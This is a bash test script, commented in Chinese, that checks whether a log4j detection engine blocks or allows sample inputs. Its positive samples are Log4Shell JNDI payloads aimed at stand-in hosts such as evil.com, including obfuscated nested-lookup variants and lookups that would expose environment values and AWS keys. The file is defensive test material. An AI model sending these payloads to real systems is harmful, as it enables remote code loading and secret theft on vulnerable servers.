#!/usr/bin/env bash
# ============================================================
# log4j 规则校验器
# ------------------------------------------------------------
# 对每个样本运行 engine，断言 BLOCK <rule> / ALLOW <rule> / NONE。
# usage: validate_log4j.sh <engine_binary> <rules_dir>
# ============================================================
set -u

ENGINE="$1"
RULES="$2"
pass=0
fail=0

check() {
    local payload="$1" expect_verdict="$2" expect_rule="${3:-}"
    local out got ok=1
    out=$("$ENGINE" --rules "$RULES" "$payload" 2>&1)
    got=$(printf '%s\n' "$out" | grep -Eo 'ALLOW|BLOCK|UNKNOWN' | tail -1)

    if [[ "$expect_rule" == "NONE" ]]; then
        if [[ "$got" != "ALLOW" && "$got" != "UNKNOWN" ]]; then ok=0; fi
        if printf '%s\n' "$out" | grep -q '!! '; then ok=0; fi
    else
        if [[ "$got" != "$expect_verdict" ]]; then ok=0; fi
        if ! printf '%s\n' "$out" | grep -q "!! ${expect_rule}"; then ok=0; fi
    fi

    if [[ $ok == 1 ]]; then
        printf '[PASS] %-16s %s\n' "$expect_rule" "$payload"
        pass=$((pass + 1))
    else
        printf '[FAIL] %-16s %s   (verdict=%s, expect=%s)\n' \
            "$expect_rule" "$payload" "$got" "$expect_verdict"
        fail=$((fail + 1))
    fi
}

# ------------------------------------------------------------
# 正样本：直接 JNDI（Log4Shell）
# ------------------------------------------------------------
check '${jndi:ldap://127.0.0.1:1389/a}'                 BLOCK   log4j_jndi
check '${jndi:rmi://evil.com/exp}'                      BLOCK   log4j_jndi
check '${jndi:ldaps://evil.com:636/a}'                  BLOCK   log4j_jndi
check '${jndi:dns://attacker.example}'                  BLOCK   log4j_jndi
check "GET /q?x=\${jndi:ldap://x/a}"                    BLOCK   log4j_jndi

# ------------------------------------------------------------
# 正样本：嵌套子语法混淆（jndi 藏在任意深度）
# ------------------------------------------------------------
check '${${lower:j}ndi:ldap://evil.com/a}'              BLOCK   log4j_jndi
check '${${::-j}ndi:ldap://evil.com/a}'                 BLOCK   log4j_jndi
check '${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://x}' BLOCK log4j_jndi
check '${env:${jndi:ldap://evil.com/a}}'                BLOCK   log4j_jndi
check '${jndi:${lower:l}dap://evil.com/a}'              BLOCK   log4j_jndi
check '${lower:${jndi:rmi://x/y}}'                      BLOCK   log4j_jndi
check '$${jndi:ldap://evil.com/a}'                      BLOCK   log4j_jndi

# ------------------------------------------------------------
# 正样本：敏感 lookup 前缀（信息泄露面）
# ------------------------------------------------------------
check '${env:HOME}'                                     BLOCK   log4j_sensitive
check '${sys:java.version}'                             BLOCK   log4j_sensitive
check '${docker:containerId}'                           BLOCK   log4j_sensitive
check '${aws:accessKey}'                                BLOCK   log4j_sensitive

# ------------------------------------------------------------
# 正样本：无 jndi 的多层嵌套链（递归滥用/DoS 防护）
# ------------------------------------------------------------
check '${lower:${upper:${env:PATH}}}'                   BLOCK   log4j_nested_chain

# ------------------------------------------------------------
# 检测层：任何 ${...} 结构（ALLOW，不拦截）
# ------------------------------------------------------------
check '${java:version}'                                 ALLOW   log4j_expr
check '${date:MM-dd-yyyy}'                              ALLOW   log4j_expr

# ------------------------------------------------------------
# 负样本：不误报
# ------------------------------------------------------------
check "hello world"                                     ALLOW   NONE
check "GET /index.html HTTP/1.1"                        ALLOW   NONE
check "user=jndi"                                       UNKNOWN NONE
check "price=10"                                        UNKNOWN NONE

# ------------------------------------------------------------
echo
echo "summary: $pass passed, $fail failed"
[[ $fail == 0 ]]
